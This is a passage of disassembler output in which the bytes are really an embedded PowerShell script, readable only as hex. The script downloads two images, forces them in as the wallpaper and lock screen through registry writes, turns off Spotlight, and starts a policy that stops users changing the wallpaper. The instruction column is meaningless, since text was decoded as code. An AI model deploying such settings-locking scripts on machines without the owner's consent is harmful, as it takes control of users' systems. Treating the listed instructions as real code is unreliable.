  404ad9:	70 65                	jo     0x404b40
  404adb:	72 2e                	jb     0x404b0b
  404add:	70 6e                	jo     0x404b4d
  404adf:	67 22 0d             	and    (%di),%cl
  404ae2:	0a 24 77             	or     (%edi,%esi,2),%ah
  404ae5:	61                   	popa
  404ae6:	6c                   	insb   (%dx),%es:(%edi)
  404ae7:	6c                   	insb   (%dx),%es:(%edi)
  404ae8:	64 65 73 74          	fs gs jae 0x404b60
  404aec:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404af3:	50                   	push   %eax
  404af4:	61                   	popa
  404af5:	74 68                	je     0x404b5f
  404af7:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404afd:	5c                   	pop    %esp
  404afe:	77 61                	ja     0x404b61
  404b00:	6c                   	insb   (%dx),%es:(%edi)
  404b01:	6c                   	insb   (%dx),%es:(%edi)
  404b02:	70 61                	jo     0x404b65
  404b04:	70 65                	jo     0x404b6b
  404b06:	72 2e                	jb     0x404b36
  404b08:	6a 70                	push   $0x70
  404b0a:	67 22 0d             	and    (%di),%cl
  404b0d:	0a 0d 0a 49 6e 76    	or     0x766e490a,%cl
  404b13:	6f                   	outsl  %ds:(%esi),(%dx)
  404b14:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404b18:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404b1c:	71 75                	jno    0x404b93
  404b1e:	65 73 74             	gs jae 0x404b95
  404b21:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404b27:	24 6c                	and    $0x6c,%al
  404b29:	6f                   	outsl  %ds:(%esi),(%dx)
  404b2a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404b2d:	6d                   	insl   (%dx),%es:(%edi)
  404b2e:	61                   	popa
  404b2f:	67 65 55             	addr16 gs push %ebp
  404b32:	72 6c                	jb     0x404ba0
  404b34:	20 2d 4f 75 74 46    	and    %ch,0x4674754f
  404b3a:	69 6c 65 20 24 6c 6f 	imul   $0x636f6c24,0x20(%ebp,%eiz,2),%ebp
  404b41:	63 
  404b42:	6b 64 65 73 74       	imul   $0x74,0x73(%ebp,%eiz,2),%esp
  404b47:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404b4e:	50                   	push   %eax
  404b4f:	61                   	popa
  404b50:	74 68                	je     0x404bba
  404b52:	0d 0a 49 6e 76       	or     $0x766e490a,%eax
  404b57:	6f                   	outsl  %ds:(%esi),(%dx)
  404b58:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404b5c:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404b60:	71 75                	jno    0x404bd7
  404b62:	65 73 74             	gs jae 0x404bd9
  404b65:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404b6b:	24 77                	and    $0x77,%al
  404b6d:	61                   	popa
  404b6e:	6c                   	insb   (%dx),%es:(%edi)
  404b6f:	6c                   	insb   (%dx),%es:(%edi)
  404b70:	69 6d 61 67 65 55 72 	imul   $0x72556567,0x61(%ebp),%ebp
  404b77:	6c                   	insb   (%dx),%es:(%edi)
  404b78:	20 2d 4f 75 74 46    	and    %ch,0x4674754f
  404b7e:	69 6c 65 20 24 77 61 	imul   $0x6c617724,0x20(%ebp,%eiz,2),%ebp
  404b85:	6c 
  404b86:	6c                   	insb   (%dx),%es:(%edi)
  404b87:	64 65 73 74          	fs gs jae 0x404bff
  404b8b:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404b92:	50                   	push   %eax
  404b93:	61                   	popa
  404b94:	74 68                	je     0x404bfe
  404b96:	0d 0a 0d 0a 24       	or     $0x240a0d0a,%eax
  404b9b:	6c                   	insb   (%dx),%es:(%edi)
  404b9c:	6f                   	outsl  %ds:(%esi),(%dx)
  404b9d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404ba0:	6d                   	insl   (%dx),%es:(%edi)
  404ba1:	61                   	popa
  404ba2:	67 65 50             	addr16 gs push %eax
  404ba5:	61                   	popa
  404ba6:	74 68                	je     0x404c10
  404ba8:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404bae:	5c                   	pop    %esp
  404baf:	6c                   	insb   (%dx),%es:(%edi)
  404bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb1:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  404bb4:	63 72 65             	arpl   %esi,0x65(%edx)
  404bb7:	65 6e                	outsb  %gs:(%esi),(%dx)
  404bb9:	2e 6a 70             	cs push $0x70
  404bbc:	67 22 0d             	and    (%di),%cl
  404bbf:	0a 24 77             	or     (%edi,%esi,2),%ah
  404bc2:	61                   	popa
  404bc3:	6c                   	insb   (%dx),%es:(%edi)
  404bc4:	6c                   	insb   (%dx),%es:(%edi)
  404bc5:	69 6d 61 67 65 50 61 	imul   $0x61506567,0x61(%ebp),%ebp
  404bcc:	74 68                	je     0x404c36
  404bce:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404bd4:	5c                   	pop    %esp
  404bd5:	77 61                	ja     0x404c38
  404bd7:	6c                   	insb   (%dx),%es:(%edi)
  404bd8:	6c                   	insb   (%dx),%es:(%edi)
  404bd9:	70 61                	jo     0x404c3c
  404bdb:	70 65                	jo     0x404c42
  404bdd:	72 2e                	jb     0x404c0d
  404bdf:	6a 70                	push   $0x70
  404be1:	67 22 0d             	and    (%di),%cl
  404be4:	0a 24 72             	or     (%edx,%esi,2),%ah
  404be7:	65 67 4b             	gs addr16 dec %ebx
  404bea:	65 79 50             	gs jns 0x404c3d
  404bed:	61                   	popa
  404bee:	74 68                	je     0x404c58
  404bf0:	20 3d 20 22 48 4b    	and    %bh,0x4b482220
  404bf6:	4c                   	dec    %esp
  404bf7:	4d                   	dec    %ebp
  404bf8:	3a 5c 53 4f          	cmp    0x4f(%ebx,%edx,2),%bl
  404bfc:	46                   	inc    %esi
  404bfd:	54                   	push   %esp
  404bfe:	57                   	push   %edi
  404bff:	41                   	inc    %ecx
  404c00:	52                   	push   %edx
  404c01:	45                   	inc    %ebp
  404c02:	5c                   	pop    %esp
  404c03:	4d                   	dec    %ebp
  404c04:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404c0b:	74 5c                	je     0x404c69
  404c0d:	57                   	push   %edi
  404c0e:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  404c15:	43                   	inc    %ebx
  404c16:	75 72                	jne    0x404c8a
  404c18:	72 65                	jb     0x404c7f
  404c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  404c1b:	74 56                	je     0x404c73
  404c1d:	65 72 73             	gs jb  0x404c93
  404c20:	69 6f 6e 5c 50 65 72 	imul   $0x7265505c,0x6e(%edi),%ebp
  404c27:	73 6f                	jae    0x404c98
  404c29:	6e                   	outsb  %ds:(%esi),(%dx)
  404c2a:	61                   	popa
  404c2b:	6c                   	insb   (%dx),%es:(%edi)
  404c2c:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  404c33:	43                   	inc    %ebx
  404c34:	53                   	push   %ebx
  404c35:	50                   	push   %eax
  404c36:	22 0d 0a 0d 0a 69    	and    0x690a0d0a,%cl
  404c3c:	66 20 28             	data16 and %ch,(%eax)
  404c3f:	21 28                	and    %ebp,(%eax)
  404c41:	54                   	push   %esp
  404c42:	65 73 74             	gs jae 0x404cb9
  404c45:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404c4a:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404c50:	20 24 72             	and    %ah,(%edx,%esi,2)
  404c53:	65 67 4b             	gs addr16 dec %ebx
  404c56:	65 79 50             	gs jns 0x404ca9
  404c59:	61                   	popa
  404c5a:	74 68                	je     0x404cc4
  404c5c:	29 29                	sub    %ebp,(%ecx)
  404c5e:	20 7b 0d             	and    %bh,0xd(%ebx)
  404c61:	0a 20                	or     (%eax),%ah
  404c63:	20 20                	and    %ah,(%eax)
  404c65:	20 4e 65             	and    %cl,0x65(%esi)
  404c68:	77 2d                	ja     0x404c97
  404c6a:	49                   	dec    %ecx
  404c6b:	74 65                	je     0x404cd2
  404c6d:	6d                   	insl   (%dx),%es:(%edi)
  404c6e:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404c74:	20 24 72             	and    %ah,(%edx,%esi,2)
  404c77:	65 67 4b             	gs addr16 dec %ebx
  404c7a:	65 79 50             	gs jns 0x404ccd
  404c7d:	61                   	popa
  404c7e:	74 68                	je     0x404ce8
  404c80:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404c86:	65 20 7c 20 4f       	and    %bh,%gs:0x4f(%eax,%eiz,1)
  404c8b:	75 74                	jne    0x404d01
  404c8d:	2d 4e 75 6c 6c       	sub    $0x6c6c754e,%eax
  404c92:	0d 0a 7d 0d 0a       	or     $0xa0d7d0a,%eax
  404c97:	0d 0a 53 65 74       	or     $0x7465530a,%eax
  404c9c:	2d 49 74 65 6d       	sub    $0x6d657449,%eax
  404ca1:	50                   	push   %eax
  404ca2:	72 6f                	jb     0x404d13
  404ca4:	70 65                	jo     0x404d0b
  404ca6:	72 74                	jb     0x404d1c
  404ca8:	79 20                	jns    0x404cca
  404caa:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404caf:	20 24 72             	and    %ah,(%edx,%esi,2)
  404cb2:	65 67 4b             	gs addr16 dec %ebx
  404cb5:	65 79 50             	gs jns 0x404d08
  404cb8:	61                   	popa
  404cb9:	74 68                	je     0x404d23
  404cbb:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  404cc1:	20 22                	and    %ah,(%edx)
  404cc3:	4c                   	dec    %esp
  404cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc5:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404cc8:	63 72 65             	arpl   %esi,0x65(%edx)
  404ccb:	65 6e                	outsb  %gs:(%esi),(%dx)
  404ccd:	49                   	dec    %ecx
  404cce:	6d                   	insl   (%dx),%es:(%edi)
  404ccf:	61                   	popa
  404cd0:	67 65 50             	addr16 gs push %eax
  404cd3:	61                   	popa
  404cd4:	74 68                	je     0x404d3e
  404cd6:	22 20                	and    (%eax),%ah
  404cd8:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404cdd:	65 20 24 6c          	and    %ah,%gs:(%esp,%ebp,2)
  404ce1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ce2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404ce5:	6d                   	insl   (%dx),%es:(%edi)
  404ce6:	61                   	popa
  404ce7:	67 65 50             	addr16 gs push %eax
  404cea:	61                   	popa
  404ceb:	74 68                	je     0x404d55
  404ced:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404cf3:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  404cf9:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  404cfc:	74 65                	je     0x404d63
  404cfe:	6e                   	outsb  %ds:(%esi),(%dx)
  404cff:	74 44                	je     0x404d45
  404d01:	65 6c                	gs insb (%dx),%es:(%edi)
  404d03:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404d0a:	6e                   	outsb  %ds:(%esi),(%dx)
  404d0b:	61                   	popa
  404d0c:	67 65 72 4b          	addr16 gs jb 0x404d5b
  404d10:	65 79 20             	gs jns 0x404d33
  404d13:	3d 20 22 48 4b       	cmp    $0x4b482220,%eax
  404d18:	43                   	inc    %ebx
  404d19:	55                   	push   %ebp
  404d1a:	3a 5c 53 4f          	cmp    0x4f(%ebx,%edx,2),%bl
  404d1e:	46                   	inc    %esi
  404d1f:	54                   	push   %esp
  404d20:	57                   	push   %edi
  404d21:	41                   	inc    %ecx
  404d22:	52                   	push   %edx
  404d23:	45                   	inc    %ebp
  404d24:	5c                   	pop    %esp
  404d25:	4d                   	dec    %ebp
  404d26:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404d2d:	74 5c                	je     0x404d8b
  404d2f:	57                   	push   %edi
  404d30:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  404d37:	43                   	inc    %ebx
  404d38:	75 72                	jne    0x404dac
  404d3a:	72 65                	jb     0x404da1
  404d3c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d3d:	74 56                	je     0x404d95
  404d3f:	65 72 73             	gs jb  0x404db5
  404d42:	69 6f 6e 5c 43 6f 6e 	imul   $0x6e6f435c,0x6e(%edi),%ebp
  404d49:	74 65                	je     0x404db0
  404d4b:	6e                   	outsb  %ds:(%esi),(%dx)
  404d4c:	74 44                	je     0x404d92
  404d4e:	65 6c                	gs insb (%dx),%es:(%edi)
  404d50:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404d57:	6e                   	outsb  %ds:(%esi),(%dx)
  404d58:	61                   	popa
  404d59:	67 65 72 22          	addr16 gs jb 0x404d7f
  404d5d:	0d 0a 69 66 20       	or     $0x2066690a,%eax
  404d62:	28 54 65 73          	sub    %dl,0x73(%ebp,%eiz,2)
  404d66:	74 2d                	je     0x404d95
  404d68:	50                   	push   %eax
  404d69:	61                   	popa
  404d6a:	74 68                	je     0x404dd4
  404d6c:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404d72:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404d75:	6f                   	outsl  %ds:(%esi),(%dx)
  404d76:	6e                   	outsb  %ds:(%esi),(%dx)
  404d77:	74 65                	je     0x404dde
  404d79:	6e                   	outsb  %ds:(%esi),(%dx)
  404d7a:	74 44                	je     0x404dc0
  404d7c:	65 6c                	gs insb (%dx),%es:(%edi)
  404d7e:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404d85:	6e                   	outsb  %ds:(%esi),(%dx)
  404d86:	61                   	popa
  404d87:	67 65 72 4b          	addr16 gs jb 0x404dd6
  404d8b:	65 79 29             	gs jns 0x404db7
  404d8e:	20 7b 0d             	and    %bh,0xd(%ebx)
  404d91:	0a 20                	or     (%eax),%ah
  404d93:	20 20                	and    %ah,(%eax)
  404d95:	20 53 65             	and    %dl,0x65(%ebx)
  404d98:	74 2d                	je     0x404dc7
  404d9a:	49                   	dec    %ecx
  404d9b:	74 65                	je     0x404e02
  404d9d:	6d                   	insl   (%dx),%es:(%edi)
  404d9e:	50                   	push   %eax
  404d9f:	72 6f                	jb     0x404e10
  404da1:	70 65                	jo     0x404e08
  404da3:	72 74                	jb     0x404e19
  404da5:	79 20                	jns    0x404dc7
  404da7:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404dac:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404daf:	6f                   	outsl  %ds:(%esi),(%dx)
  404db0:	6e                   	outsb  %ds:(%esi),(%dx)
  404db1:	74 65                	je     0x404e18
  404db3:	6e                   	outsb  %ds:(%esi),(%dx)
  404db4:	74 44                	je     0x404dfa
  404db6:	65 6c                	gs insb (%dx),%es:(%edi)
  404db8:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  404dc0:	61                   	popa
  404dc1:	67 65 72 4b          	addr16 gs jb 0x404e10
  404dc5:	65 79 20             	gs jns 0x404de8
  404dc8:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  404dcd:	20 22                	and    %ah,(%edx)
  404dcf:	52                   	push   %edx
  404dd0:	6f                   	outsl  %ds:(%esi),(%dx)
  404dd1:	74 61                	je     0x404e34
  404dd3:	74 69                	je     0x404e3e
  404dd5:	6e                   	outsb  %ds:(%esi),(%dx)
  404dd6:	67 4c                	addr16 dec %esp
  404dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  404dd9:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404ddc:	63 72 65             	arpl   %esi,0x65(%edx)
  404ddf:	65 6e                	outsb  %gs:(%esi),(%dx)
  404de1:	45                   	inc    %ebp
  404de2:	6e                   	outsb  %ds:(%esi),(%dx)
  404de3:	61                   	popa
  404de4:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  404de8:	22 20                	and    (%eax),%ah
  404dea:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404def:	65 20 30             	and    %dh,%gs:(%eax)
  404df2:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404df8:	65 0d 0a 20 20 20    	gs or  $0x2020200a,%eax
  404dfe:	20 53 65             	and    %dl,0x65(%ebx)
  404e01:	74 2d                	je     0x404e30
  404e03:	49                   	dec    %ecx
  404e04:	74 65                	je     0x404e6b
  404e06:	6d                   	insl   (%dx),%es:(%edi)
  404e07:	50                   	push   %eax
  404e08:	72 6f                	jb     0x404e79
  404e0a:	70 65                	jo     0x404e71
  404e0c:	72 74                	jb     0x404e82
  404e0e:	79 20                	jns    0x404e30
  404e10:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404e15:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404e18:	6f                   	outsl  %ds:(%esi),(%dx)
  404e19:	6e                   	outsb  %ds:(%esi),(%dx)
  404e1a:	74 65                	je     0x404e81
  404e1c:	6e                   	outsb  %ds:(%esi),(%dx)
  404e1d:	74 44                	je     0x404e63
  404e1f:	65 6c                	gs insb (%dx),%es:(%edi)
  404e21:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404e28:	6e                   	outsb  %ds:(%esi),(%dx)
  404e29:	61                   	popa
  404e2a:	67 65 72 4b          	addr16 gs jb 0x404e79
  404e2e:	65 79 20             	gs jns 0x404e51
  404e31:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  404e36:	20 22                	and    %ah,(%edx)
  404e38:	52                   	push   %edx
  404e39:	6f                   	outsl  %ds:(%esi),(%dx)
  404e3a:	74 61                	je     0x404e9d
  404e3c:	74 69                	je     0x404ea7
  404e3e:	6e                   	outsb  %ds:(%esi),(%dx)
  404e3f:	67 4c                	addr16 dec %esp
  404e41:	6f                   	outsl  %ds:(%esi),(%dx)
  404e42:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404e45:	63 72 65             	arpl   %esi,0x65(%edx)
  404e48:	65 6e                	outsb  %gs:(%esi),(%dx)
  404e4a:	4f                   	dec    %edi
  404e4b:	76 65                	jbe    0x404eb2
  404e4d:	72 6c                	jb     0x404ebb
  404e4f:	61                   	popa
  404e50:	79 45                	jns    0x404e97
  404e52:	6e                   	outsb  %ds:(%esi),(%dx)
  404e53:	61                   	popa
  404e54:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  404e58:	22 20                	and    (%eax),%ah
  404e5a:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404e5f:	65 20 30             	and    %dh,%gs:(%eax)
  404e62:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404e68:	65 0d 0a 20 20 20    	gs or  $0x2020200a,%eax
  404e6e:	20 53 65             	and    %dl,0x65(%ebx)
  404e71:	74 2d                	je     0x404ea0
  404e73:	49                   	dec    %ecx
  404e74:	74 65                	je     0x404edb
  404e76:	6d                   	insl   (%dx),%es:(%edi)
  404e77:	50                   	push   %eax
  404e78:	72 6f                	jb     0x404ee9
  404e7a:	70 65                	jo     0x404ee1
  404e7c:	72 74                	jb     0x404ef2
  404e7e:	79 20                	jns    0x404ea0
  404e80:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404e85:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404e88:	6f                   	outsl  %ds:(%esi),(%dx)
  404e89:	6e                   	outsb  %ds:(%esi),(%dx)
  404e8a:	74 65                	je     0x404ef1
  404e8c:	6e                   	outsb  %ds:(%esi),(%dx)
  404e8d:	74 44                	je     0x404ed3
  404e8f:	65 6c                	gs insb (%dx),%es:(%edi)
  404e91:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404e98:	6e                   	outsb  %ds:(%esi),(%dx)
  404e99:	61                   	popa
  404e9a:	67 65 72 4b          	addr16 gs jb 0x404ee9
  404e9e:	65 79 20             	gs jns 0x404ec1
  404ea1:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  404ea6:	20 22                	and    %ah,(%edx)
  404ea8:	53                   	push   %ebx
  404ea9:	75 62                	jne    0x404f0d
  404eab:	73 63                	jae    0x404f10
  404ead:	72 69                	jb     0x404f18
  404eaf:	62 65 64             	bound  %esp,0x64(%ebp)
  404eb2:	43                   	inc    %ebx
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	6e                   	outsb  %ds:(%esi),(%dx)
  404eb5:	74 65                	je     0x404f1c
  404eb7:	6e                   	outsb  %ds:(%esi),(%dx)
  404eb8:	74 2d                	je     0x404ee7
  404eba:	33 33                	xor    (%ebx),%esi
  404ebc:	38 33                	cmp    %dh,(%ebx)
  404ebe:	38 37                	cmp    %dh,(%edi)
  404ec0:	45                   	inc    %ebp
  404ec1:	6e                   	outsb  %ds:(%esi),(%dx)
  404ec2:	61                   	popa
  404ec3:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  404ec7:	22 20                	and    (%eax),%ah
  404ec9:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404ece:	65 20 30             	and    %dh,%gs:(%eax)
  404ed1:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404ed7:	65 20 23             	and    %ah,%gs:(%ebx)
  404eda:	20 44 69 73          	and    %al,0x73(%ecx,%ebp,2)
  404ede:	61                   	popa
  404edf:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  404ee3:	20 53 70             	and    %dl,0x70(%ebx)
  404ee6:	6f                   	outsl  %ds:(%esi),(%dx)
  404ee7:	74 6c                	je     0x404f55
  404ee9:	69 67 68 74 0d 0a 7d 	imul   $0x7d0a0d74,0x68(%edi),%esp
  404ef0:	0d 0a 0d 0a 53       	or     $0x530a0d0a,%eax
  404ef5:	65 74 2d             	gs je  0x404f25
  404ef8:	49                   	dec    %ecx
  404ef9:	74 65                	je     0x404f60
  404efb:	6d                   	insl   (%dx),%es:(%edi)
  404efc:	50                   	push   %eax
  404efd:	72 6f                	jb     0x404f6e
  404eff:	70 65                	jo     0x404f66
  404f01:	72 74                	jb     0x404f77
  404f03:	79 20                	jns    0x404f25
  404f05:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404f0a:	20 27                	and    %ah,(%edi)
  404f0c:	48                   	dec    %eax
  404f0d:	4b                   	dec    %ebx
  404f0e:	43                   	inc    %ebx
  404f0f:	55                   	push   %ebp
  404f10:	3a 5c 43 6f          	cmp    0x6f(%ebx,%eax,2),%bl
  404f14:	6e                   	outsb  %ds:(%esi),(%dx)
  404f15:	74 72                	je     0x404f89
  404f17:	6f                   	outsl  %ds:(%esi),(%dx)
  404f18:	6c                   	insb   (%dx),%es:(%edi)
  404f19:	20 50 61             	and    %dl,0x61(%eax)
  404f1c:	6e                   	outsb  %ds:(%esi),(%dx)
  404f1d:	65 6c                	gs insb (%dx),%es:(%edi)
  404f1f:	5c                   	pop    %esp
  404f20:	44                   	inc    %esp
  404f21:	65 73 6b             	gs jae 0x404f8f
  404f24:	74 6f                	je     0x404f95
  404f26:	70 5c                	jo     0x404f84
  404f28:	27                   	daa
  404f29:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  404f2f:	20 27                	and    %ah,(%edi)
  404f31:	57                   	push   %edi
  404f32:	61                   	popa
  404f33:	6c                   	insb   (%dx),%es:(%edi)
  404f34:	6c                   	insb   (%dx),%es:(%edi)
  404f35:	50                   	push   %eax
  404f36:	61                   	popa
  404f37:	70 65                	jo     0x404f9e
  404f39:	72 27                	jb     0x404f62
  404f3b:	20 2d 56 61 6c 75    	and    %ch,0x756c6156
  404f41:	65 20 24 77          	and    %ah,%gs:(%edi,%esi,2)
  404f45:	61                   	popa
  404f46:	6c                   	insb   (%dx),%es:(%edi)
  404f47:	6c                   	insb   (%dx),%es:(%edi)
  404f48:	69 6d 61 67 65 50 61 	imul   $0x61506567,0x61(%ebp),%ebp
  404f4f:	74 68                	je     0x404fb9
  404f51:	0d 0a 0d 0a 72       	or     $0x720a0d0a,%eax
  404f56:	75 6e                	jne    0x404fc6
  404f58:	64 6c                	fs insb (%dx),%es:(%edi)
  404f5a:	6c                   	insb   (%dx),%es:(%edi)
  404f5b:	33 32                	xor    (%edx),%esi
  404f5d:	2e 65 78 65          	cs js,pn 0x404fc6
  404f61:	20 75 73             	and    %dh,0x73(%ebp)
  404f64:	65 72 33             	gs jb  0x404f9a
  404f67:	32 2e                	xor    (%esi),%ch
  404f69:	64 6c                	fs insb (%dx),%es:(%edi)
  404f6b:	6c                   	insb   (%dx),%es:(%edi)
  404f6c:	2c 20                	sub    $0x20,%al
  404f6e:	55                   	push   %ebp
  404f6f:	70 64                	jo     0x404fd5
  404f71:	61                   	popa
  404f72:	74 65                	je     0x404fd9
  404f74:	50                   	push   %eax
  404f75:	65 72 55             	gs jb  0x404fcd
  404f78:	73 65                	jae    0x404fdf
  404f7a:	72 53                	jb     0x404fcf
  404f7c:	79 73                	jns    0x404ff1
  404f7e:	74 65                	je     0x404fe5
  404f80:	6d                   	insl   (%dx),%es:(%edi)
  404f81:	50                   	push   %eax
  404f82:	61                   	popa
  404f83:	72 61                	jb     0x404fe6
  404f85:	6d                   	insl   (%dx),%es:(%edi)
  404f86:	65 74 65             	gs je  0x404fee
  404f89:	72 73                	jb     0x404ffe
  404f8b:	20 31                	and    %dh,(%ecx)
  404f8d:	2c 20                	sub    $0x20,%al
  404f8f:	54                   	push   %esp
  404f90:	72 75                	jb     0x405007
  404f92:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  404f98:	52                   	push   %edx
  404f99:	65 67 50             	gs addr16 push %eax
  404f9c:	61                   	popa
  404f9d:	74 68                	je     0x405007
  404f9f:	20 3d 20 22 48 4b    	and    %bh,0x4b482220
  404fa5:	43                   	inc    %ebx
  404fa6:	55                   	push   %ebp
  404fa7:	3a 5c 53 6f          	cmp    0x6f(%ebx,%edx,2),%bl
  404fab:	66 74 77             	data16 je 0x405025
  404fae:	61                   	popa
  404faf:	72 65                	jb     0x405016
  404fb1:	5c                   	pop    %esp
  404fb2:	4d                   	dec    %ebp
  404fb3:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404fba:	74 5c                	je     0x405018
  404fbc:	57                   	push   %edi
  404fbd:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  404fc4:	43                   	inc    %ebx
  404fc5:	75 72                	jne    0x405039
  404fc7:	72 65                	jb     0x40502e
  404fc9:	6e                   	outsb  %ds:(%esi),(%dx)
  404fca:	74 56                	je     0x405022
  404fcc:	65 72 73             	gs jb  0x405042
  404fcf:	69 6f 6e 5c 50 6f 6c 	imul   $0x6c6f505c,0x6e(%edi),%ebp
  404fd6:	69 63 69 65 73 5c 41 	imul   $0x415c7365,0x69(%ebx),%esp
  404fdd:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  404fe1:	65 44                	gs inc %esp
  404fe3:	65 73 6b             	gs jae 0x405051
  404fe6:	74 6f                	je     0x405057
  404fe8:	70 22                	jo     0x40500c
  404fea:	0d 0a 0d 0a 49       	or     $0x490a0d0a,%eax
  404fef:	66 20 28             	data16 and %ch,(%eax)
  404ff2:	2d 6e 6f 74 20       	sub    $0x20746f6e,%eax
  404ff7:	28 54 65 73          	sub    %dl,0x73(%ebp,%eiz,2)
  404ffb:	74 2d                	je     0x40502a
  404ffd:	50                   	push   %eax
  404ffe:	61                   	popa
  404fff:	74 68                	je     0x405069
  405001:	20 24 52             	and    %ah,(%edx,%edx,2)
  405004:	65 67 50             	gs addr16 push %eax
  405007:	61                   	popa
  405008:	74 68                	je     0x405072
  40500a:	29 29                	sub    %ebp,(%ecx)
  40500c:	20 7b 0d             	and    %bh,0xd(%ebx)
  40500f:	0a 20                	or     (%eax),%ah
  405011:	20 20                	and    %ah,(%eax)
  405013:	20 4e 65             	and    %cl,0x65(%esi)
  405016:	77 2d                	ja     0x405045
  405018:	49                   	dec    %ecx
  405019:	74 65                	je     0x405080
  40501b:	6d                   	insl   (%dx),%es:(%edi)
  40501c:	20 2d 50 61 74 68    	and    %ch,0x68746150
  405022:	20 24 52             	and    %ah,(%edx,%edx,2)
  405025:	65 67 50             	gs addr16 push %eax
  405028:	61                   	popa
  405029:	74 68                	je     0x405093
  40502b:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  405031:	65 20 7c 20 4f       	and    %bh,%gs:0x4f(%eax,%eiz,1)
  405036:	75 74                	jne    0x4050ac
  405038:	2d 4e 75 6c 6c       	sub    $0x6c6c754e,%eax
  40503d:	0d 0a 7d 0d 0a       	or     $0xa0d7d0a,%eax
  405042:	0d 0a 53 65 74       	or     $0x7465530a,%eax
  405047:	2d 49 74 65 6d       	sub    $0x6d657449,%eax
  40504c:	50                   	push   %eax
  40504d:	72 6f                	jb     0x4050be
  40504f:	70 65                	jo     0x4050b6
  405051:	72 74                	jb     0x4050c7
  405053:	79 20                	jns    0x405075
  405055:	2d 50 61 74 68       	sub    $0x68746150,%eax
  40505a:	20 24 52             	and    %ah,(%edx,%edx,2)
  40505d:	65 67 50             	gs addr16 push %eax
  405060:	61                   	popa
  405061:	74 68                	je     0x4050cb
  405063:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  405069:	20 22                	and    %ah,(%edx)
  40506b:	4e                   	dec    %esi
  40506c:	6f                   	outsl  %ds:(%esi),(%dx)
  40506d:	43                   	inc    %ebx
